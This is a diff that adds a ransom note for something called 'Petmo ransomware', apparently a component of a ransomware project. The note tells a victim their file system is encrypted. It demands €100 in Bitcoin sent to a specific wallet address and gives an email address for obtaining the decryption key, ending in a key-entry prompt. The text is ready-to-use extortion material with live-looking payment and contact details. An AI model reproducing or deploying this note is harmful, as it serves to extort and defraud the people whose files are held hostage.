@@ -1,0 +1,18 @@
+  Oops, your file system got encrypted by Petmo ransomware!
+======================================================================
+ If you can read this text, then your computer is no longer usable, because it
+ got encrypted. You can not use your computer again without a specific
+ decryption key. Note that the key costs. To purchase it, follow these steps
+
+   - Send €100 worth of Bitcoin to this address:
+
+    bc1qxcnwcmvfshqv8jxdusqp97zw8uc9xkrlsw79gv 
+
+   - Contact petmcus@tutamail.com to get your personal decryption key
+
+   When you have recieved the key, please enter it below.
+
+ We promise that you will be able to get your files back.
+ All you have to do is follow previously mentoned steps.
+
+ Key: 
